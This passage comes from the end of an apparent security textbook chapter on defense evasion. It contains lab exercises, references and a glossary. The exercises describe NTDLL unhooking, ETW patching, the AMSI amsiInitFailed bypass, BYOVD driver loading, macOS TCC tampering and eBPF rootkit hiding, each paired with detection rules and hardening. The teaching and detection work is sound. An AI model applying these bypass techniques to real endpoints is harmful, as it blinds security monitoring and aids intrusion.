**To Domain 5:** Kernel rootkits (Chapter 11A §3) and eBPF rootkits (§3.4) require the kernel exploitation primitives from Domain 5 to install (unless the attacker already has root). The SLUB allocator knowledge (Domain 5, Chapter 5A §1) is relevant for kernel rootkits that manipulate kernel objects. Container escapes (§3.6) may chain kernel exploits from Domain 5. BYOVD kernel R/W primitives (§4.5, §4.6) use the same exploitation primitives to disable EDR callbacks and ETW providers.

**To Domain 10:** Container escapes (Chapter 10B §1.6) lead to host-level access where these persistence and evasion techniques apply. A containerized attacker who escapes gains access to the host's systemd, cron, PAM, and kernel module infrastructure. macOS/Linux persistence techniques (§2.1, §3.1) are the post-exploitation actions after a cloud instance or container is compromised. WDAC/AppLocker (§1.6) is the application-control counterpart to cloud-native admission controllers (Chapter 10B §2). EDR deployment verification (§7.5) must include containerized workload coverage.

**To Domain 14A:** AMSI bypass (§1.5, §4.7) and PowerShell evasion (§1.6) are prerequisites for executing AD attack tools (Rubeus, PowerView, Certify) in memory on domain-joined hosts. ETW patching (§1.4) and kernel-level ETW disabling (§4.5) suppress the telemetry that would detect Kerberoasting, DCSync, and ADCS exploitation. PPID spoofing (§1.6) disguises the process tree of AD attack tools. Advanced injection methods (§4.2–§4.4) enable stealthy delivery of AD attack payloads into trusted processes.

**To Domain 27:** Detection engineering for evasion techniques — Sigma rules from §3D and §6 feed into SIEM correlation (Chapter 27C). The ETW Threat Intelligence provider (§1.4, §5.1) is a primary data source for detection engineering. WDAC policies (§1.6) implement the application control layer of Zero Trust (Chapter 27B). EDR architecture (§5) and hardening (§7) are foundational to the endpoint security layer of Defense-in-Depth (Chapter 27A). Honeypot-based detection (§6.4) complements the deception technologies in Chapter 27D.

---

## Exercises

> See also: [tutorials/tutorial_domain11_ch11B_edr_evasion_lab.md](tutorials/tutorial_domain11_ch11B_edr_evasion_lab.md)

**Exercise 11B.1 — NTDLL unhooking detection lab (T1562.001).** In a Windows VM with an EDR agent (or simulated hooks on ntdll), implement the KnownDlls-based unhooking technique (§1.2): map `\KnownDlls\ntdll.dll` via `NtOpenSection`, overwrite the hooked `.text` section, and restore original syscall stubs. Monitor via: (a) ETW `Microsoft-Windows-Kernel-Audit-API-Calls` for `NtProtectVirtualMemory` on ntdll address range, (b) Sysmon Event ID 7 for duplicate ntdll mappings, (c) periodic `.text` hash comparison (compute SHA-256 of ntdll `.text` before and after unhooking). Write a detection script that alerts when the ntdll `.text` hash changes from the expected hooked state. Deploy the peridot variant (fresh ntdll at a different address without modifying the hooked copy) and verify that detection via multiple-mapping monitoring still catches it. Document which telemetry sources fail for each variant and which succeed. Reference: T1562.001 (Impair Defenses: Disable or Modify Tools).

**Exercise 11B.2 — ETW patching and AMSI bypass identification (T1562.006).** Write a C program that patches `ntdll!EtwEventWrite` with `xor eax, eax; ret` (§1.4 — compilable form in §3A.1). Before patching, generate a .NET ETW event (`Assembly.Load`); after patching, generate another and verify it is not received by an ETW consumer. Detect the patch using the ETW canary technique (§1.4 hardening #5): a watchdog process that writes canary events and alerts when they stop arriving. For AMSI bypass, execute the `amsiInitFailed` reflection technique (§1.5 — §3A.2) in PowerShell and verify that a known EICAR test string is not detected. Detect via PowerShell Script Block Logging (Event ID 4104) with the Sigma rule from §1.5 matching `AmsiUtils` and `amsiInitFailed` strings. Enable WDAC Constrained Language Mode and verify the AMSI bypass fails. Attempt PowerShell v2 downgrade and detect via Event ID 400 (`EngineVersion: 2.x`). Reference: T1562.006 (Impair Defenses: Indicator Blocking).

**Exercise 11B.3 — BYOVD driver detection and HVCI enforcement (T1068).** In a Windows VM with HVCI disabled, load the `RTCore64.sys` driver (§11A 3.5) via `sc.exe create ... type= kernel`. Capture Sysmon Event ID 6 (driver loaded) and Event ID 1 (sc.exe with `type= kernel`). Verify the driver hash against Microsoft's Vulnerable Driver Blocklist and LOLDrivers. Use the driver's IOCTL to read kernel memory and confirm kernel R/W capability. Enable HVCI (`reg add ... VulnerableDriverBlocklistEnable /t REG_DWORD /d 1`) and attempt to reload the driver — verify it is blocked. Write a Sigma rule matching Sysmon Event ID 6 for known BYOVD driver names (`RTCore64.sys`, `DBUtil_2_3.sys`, `gdrv.sys`, `mhyprot2.sys`, `ProcExp152.sys`). Test against the Reynolds ransomware BYOVD pattern (CVE-2025-68947 — NsecSoft driver). Reference: T1068 (Exploitation for Privilege Escalation), T1543.003 (Create or Modify System Process: Windows Service).

**Exercise 11B.4 — macOS TCC bypass and ESF detection (T1548).** On a macOS VM (SIP disabled for lab purposes), perform the TCC database direct manipulation technique (§2.2 / §3B.1): insert a row into `~/Library/Application Support/com.apple.TCC/TCC.db` granting `kTCCServiceAccessibility` to a test application. Verify the application gains Accessibility access without a TCC prompt. Detect via: (a) ESF `ES_EVENT_TYPE_NOTIFY_OPEN` on `TCC.db`, (b) `fs_usage` monitoring for `sqlite3` accessing TCC paths, (c) `KnockKnock` persistence scan. Demonstrate the `DYLD_INSERT_LIBRARIES` persistence technique (§2.1) on a third-party application without `library-validation` entitlement. Detect via `launchctl list` and process environment inspection (`ps eww`). Restore SIP and verify both techniques fail. Document which ESF event types cover each attack and which have blind spots. Reference: T1548 (Abuse Elevation Control Mechanism), T1547.015 (Login Items).

**Exercise 11B.5 — Linux eBPF rootkit detection and auditd hardening.** In a Linux VM (kernel 5.15+ with `CAP_BPF`), load the eBPF process-hiding skeleton from §3C.1 (or a simplified TripleCross component). Verify process hiding by comparing `ps aux | wc -l` with `ls /proc/*/exe 2>/dev/null | wc -l`. Detect using: (a) `bpftool prog list` to enumerate attached eBPF programs, (b) `bpftool prog dump xlated id <N>` to inspect bytecode, (c) auditd rule `-a always,exit -F arch=b64 -S bpf -k ebpf_load`. Write a Falco rule that alerts on `bpf()` syscalls with `BPF_PROG_LOAD` from non-standard processes. Harden: set `kernel.unprivileged_bpf_disabled=1`, enable `CONFIG_MODULE_SIG_FORCE`, deploy auditd rules in immutable mode (`auditctl -e 2`). Attempt to reload the eBPF program and verify failure. Test the `memfd_create` fileless execution technique (§3.2 / §3C.4) and verify auditd captures the syscall. Reference: T1014 (Rootkit), T1059 (Command and Scripting Interpreter), T1562.012 (Disable or Modify Linux Audit System).

---

## Readings and References

(retrieved: 2026-05-29)

- MITRE ATT&CK — Defense Evasion (TA0005): <https://attack.mitre.org/tactics/TA0005/>
- MITRE ATT&CK — T1562 (Impair Defenses) and subtechniques: <https://attack.mitre.org/techniques/T1562/>
- MITRE ATT&CK — T1055 (Process Injection): <https://attack.mitre.org/techniques/T1055/>
- RingSafe, "EDR Bypass Techniques in 2026: How Modern Threats Evade Endpoint Defenses" (2026): <https://ringsafe.in/edr-bypass-techniques-2026-endpoint-evasion/>
- Threat Intel Report, "BYOVD in 2026: The Signed-Driver Loophole Powering EDR Bypass at Scale" (2026-02): <https://www.threatintelreport.com/2026/02/21/articles/byovd-in-2026-the-signed-driver-loophole-powering-edr-bypass-at-scale/>
- Reynolds ransomware — embedded NsecSoft BYOVD driver (CVE-2025-68947): <https://cybersecsentinel.com/reynolds-ransomware-shows-why-byovd-is-the-new-edr-bypass/>
- Vectra AI, "EDR Evasion: Techniques, Real-World Breaches, and Defenses": <https://www.vectra.ai/topics/edr-evasion>
- d3lt4labs, "Hunting Memory-Only Malware with ATT&CK and YARA" (2025): <https://medium.com/@d3lt4labs/hunting-memory-only-malware-with-att-ck-and-yara-de68756f3274>
- CVE-2020-9934 — macOS TCC bypass via environment variable injection: <https://nvd.nist.gov/vuln/detail/CVE-2020-9934>
- CVE-2024-44133 — Safari TCC bypass ("HM Surf"): <https://nvd.nist.gov/vuln/detail/CVE-2024-44133>
- LOLDrivers — curated vulnerable driver database: <https://www.loldrivers.io/>
- Microsoft, "Vulnerable Driver Blocklist": <https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules>
- Objective-See — macOS security tools (KnockKnock, BlockBlock, LuLu): <https://objective-see.org/tools.html>
- LKRG — Linux Kernel Runtime Guard: <https://lkrg.org/>

---

## Cross-Reference Map

| Source Section | Target Chapter | Relationship |
|---|---|---|
| §1.2-1.3 Unhooking and syscalls | Chapter 11A §1 (Injection) | Evasion techniques counter the detection methods triggered by injection primitives in 11A |
| §1.4 ETW patching | Domain 7 (SIEM/Detection) | ETW suppression blinds SIEM data sources; Threat Intelligence ETW provider is the counter |
| §1.5 AMSI bypass | Domain 14A (AD attacks) | AMSI bypass is prerequisite for executing in-memory AD tools (Rubeus, PowerView, Certify) |
| §2.1-2.5 macOS tradecraft | Domain 10 (Cloud) | macOS persistence/evasion applies to compromised cloud instances running macOS workloads |
| §3.1-3.6 Linux tradecraft | Chapter 10B §1.6 (Container escape) | Container escape yields host access where Linux persistence/evasion techniques apply |
| §1.6 WDAC/AppLocker bypass | Chapter 10B §2.6 (Admission controllers) | WDAC is the endpoint analogue of K8s admission controllers — both enforce allow-list policies |

---

## Glossary

| Term | Definition |
|---|---|
| **NTDLL Unhooking** | Technique restoring original ntdll syscall stubs by overwriting EDR-placed hooks with a clean copy from KnownDlls or disk |
| **Direct Syscall** | Executing the `syscall` instruction from attacker code with the correct SSN, bypassing ntdll hooks entirely |
| **Indirect Syscall** | Jumping to the `syscall; ret` gadget inside ntdll after setting up registers, so the return address points to legitimate ntdll code |
| **Call-Stack Spoofing** | Fabricating stack frames to make a syscall appear to originate from a legitimate code path rather than unbacked memory |
| **ETW** | Event Tracing for Windows — kernel-integrated telemetry framework producing events consumed by EDRs, Sysmon, and SIEMs |
| **AMSI** | Antimalware Scan Interface — Windows API allowing security products to scan dynamic content (PowerShell, .NET, VBA) before execution |
| **CLM** | Constrained Language Mode — PowerShell restriction disabling .NET type access, COM objects, and `Add-Type` when WDAC is active |
| **WDAC** | Windows Defender Application Control — kernel-enforced code integrity policy restricting which binaries and DLLs can execute |
| **HVCI** | Hypervisor-protected Code Integrity — uses VBS to enforce that only signed code runs in kernel mode |
| **Sleep Masking** | C2 implant technique encrypting its own memory and marking pages non-executable during sleep intervals to evade scanning |
| **TCC** | Transparency, Consent, and Control — macOS privacy framework requiring explicit user consent for sensitive resource access |
| **ESF** | Endpoint Security Framework — macOS kernel-level API providing security tools with process, file, and network event notifications |
| **Dylib Hijacking** | macOS attack placing a malicious dynamic library at an `@rpath` search location before the legitimate library |
| **memfd_create** | Linux syscall creating an anonymous in-memory file descriptor for fileless execution — binary never touches disk |
| **LKRG** | Linux Kernel Runtime Guard — kernel module detecting runtime modifications to syscall tables, credentials, and kernel code |
